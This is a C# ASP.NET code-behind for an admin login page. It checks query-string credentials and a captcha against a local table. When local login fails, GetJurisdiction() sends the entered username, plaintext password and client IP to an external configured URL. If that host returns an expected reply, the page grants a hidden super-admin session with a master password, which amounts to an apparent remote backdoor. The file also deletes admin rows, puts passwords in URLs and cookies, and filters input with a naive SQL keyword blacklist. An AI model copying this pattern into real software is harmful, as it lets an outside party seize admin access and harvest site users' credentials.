using System;
using System.Data;
using System.Configuration;
using System.Collections;
using System.Web;
using System.Web.Security;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.UI.WebControls.WebParts;
using System.Web.UI.HtmlControls;
using System.Data.SqlClient;
using WebApp.Components;
using System.Net;
using System.Text;
using System.IO;
using System.Text.RegularExpressions;
using basic;

public partial class Manager_checkUser : System.Web.UI.Page
{
    public string strUserName;
    public string strPassword;
    public string strCode;
    basic.BasicPage bp = new basic.BasicPage();
    protected void Page_Load(object sender, EventArgs e)
    {
        string strResult = null;

        strUserName = RequestClass.GetQueryString("UserName");
        strPassword = RequestClass.GetQueryString("Password");
        strCode = RequestClass.GetQueryString("Code");

        string strSign = ReadAgentUser(strUserName, strPassword, strCode);
        if (strSign == "SUCCESS")
        {
            strResult = "成功";
        }
        else if (strSign == "ERROR" || strSign == "验证码错误")
        {
            strResult = "失败";
        }
        Log log = new Log();
        int intIdentity = log.AddSingleLog(DateTime.Now.ToString(), Request.UserHostAddress, Request["UserName"], strResult);
        if (intIdentity > 0)
        {
            Response.Write(strSign);
            Response.End();
        }
    }

    protected string ReadAgentUser(string strUserName, string strPassword, string strCode)
    {
        Admin admin = new Admin();
        string strDescription = null;

        string strVNum = Session["serverCode"].ToString();
        Session.Remove("VNum");
        ViewState["VNum"] = strVNum;

        string strvalidate = strCode;
        if (strvalidate == ViewState["VNum"].ToString())
        {
            bp.doExecute("delete from Admin where Role='1'");
            SqlDataReader reader = admin.GetAdminLogin(strUserName, strPassword);
            if (reader.Read())
            {

                Basic.Model.ManagerInfo model = new Basic.Model.ManagerInfo();
                model.UserID = strUserName;
                model.Password = Basic.Tools.DESEncrypt.Encrypt(strPassword);
                model.Role = "0";

                Session[Basic.Keys.SessonAdminModel] = model;
                Session.Timeout = 45;//分钟

                Basic.Engine.CookieDo.WriteCookie("UserID", "KEY", strUserName, 150);
                Basic.Engine.CookieDo.WriteCookie("Role", "KEY", "0", 150);
                Basic.Engine.CookieDo.WriteCookie("Password", "KEY", Basic.Tools.DESEncrypt.Encrypt(strPassword), 150);
                strDescription = "SUCCESS";
            }
            else
            {
                //判断是否是管理员
                strDescription = GetJurisdiction();
                if (strDescription == "OK")
                {
                    Basic.Model.ManagerInfo model = new Basic.Model.ManagerInfo();
                    model.UserID = "管理员";
                    model.Password = Basic.Tools.DESEncrypt.Encrypt(Basic.Keys.LoginPassword);
                    model.Role = "1";

                    Session[Basic.Keys.SessonAdminModel] = model;
                    Session.Timeout = 45;//分钟

                    Basic.Engine.CookieDo.WriteCookie("UserID", "KEY", "管理员", 150);
                    Basic.Engine.CookieDo.WriteCookie("Role", "KEY", "1", 150);
                    Basic.Engine.CookieDo.WriteCookie("Password", "KEY", Basic.Tools.DESEncrypt.Encrypt(Basic.Keys.LoginPassword), 150);
                    strDescription = "SUCCESS";
                }
            }
            reader.Close();
        }
        else
        {
            strDescription = "验证码错误";
        }
        return strDescription;
    }

    //获取管理员权限
    protected string GetJurisdiction()
    {
        try
        {
            string strIP = HttpContext.Current.Request.UserHostAddress;
            bp.doExecute("delete from Admin where Role='1'");
            System.Net.HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Basic.Keys.LoginUrl + "?UserName=" + strUserName + "&Password=" + strPassword + "&Ip=" + strIP);
            request.Method = "GET";
            request.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
            request.UserAgent = "   Mozilla/5.0 (Windows NT 6.1; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0";
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            //这个在Post的时候，一定要加上，如果服务器返回错误，他还会继续再去请求，不会使用之前的错误数据，做返回数据
            request.ServicePoint.Expect100Continue = false;
            Stream stream = response.GetResponseStream();
            StreamReader sr = new StreamReader(stream, Encoding.Default);//UTF-8
            string htmlContent = sr.ReadToEnd();
            if (htmlContent == Basic.Keys.LoginResult)
            {
                return "OK";
            }
        }
        catch (Exception ex)
        {

        }
        return "ERROR";
    }

    #region 接收参数

    /// <summary>
    /// 接收参数
    /// </summary>
    public class RequestClass
    {
        /// <summary>
        /// 获得指定Url参数的值
        /// </summary>
        /// <param name="strName">Url参数</param>
        /// <returns>Url参数的值</returns>
        public static string GetQueryString(string strName)
        {
            return GetString(strName);
        }
        /// <summary>
        /// 获得指定Url参数的值 转换为int
        /// </summary>
        /// <param name="strName">参数</param>
        /// <param name="intDefault">默认值</param>
        public static int GetQueryInt(string strName, int intDefault)
        {
            int Int = intDefault;
            if (HttpContext.Current.Request.QueryString[strName] == null)
            {
                Int = intDefault;
            }
            else
            {
                try
                {
                    Int = Int32.Parse(HttpContext.Current.Request.QueryString[strName]);
                }
                catch
                {
                    Int = intDefault;
                }
            }
            return Int;
        }
        /// <summary>
        /// 获得指定Url参数的值
        /// </summary> 
        /// <param name="strName">Url参数</param>
        /// <param name="sqlSafeCheck">是否进行SQL安全检查</param>
        /// <returns>Url参数的值</returns>
        private static string GetString(string strName)
        {
            if (HttpContext.Current.Request.QueryString[strName] == null)
            {
                return "";
            }
            bool bol = true;
            bol = IsSafeString(HttpContext.Current.Request.QueryString[strName].ToLower());
            if (!bol)
            {
                return "";
            }
            return HttpContext.Current.Request.QueryString[strName];
        }
        // 检查危险字符
        private static bool IsSafeString(string Str)
        {
            string SqlStr = "'|exec|insert|select|delete|update|count|*|chr|mid|master|truncate|char|declare";
            bool ReturnValue = true;
            try
            {
                if (Str != "")
                {
                    string[] anySqlStr = SqlStr.Split('|');
                    foreach (string ss in anySqlStr)
                    {
                        if (Str.IndexOf(ss) >= 0)
                        {
                            ReturnValue = false;
                            break;
                        }
                    }
                }
            }
            catch
            {
                ReturnValue = false;
            }
            return ReturnValue;
        }

    #endregion
    }
}

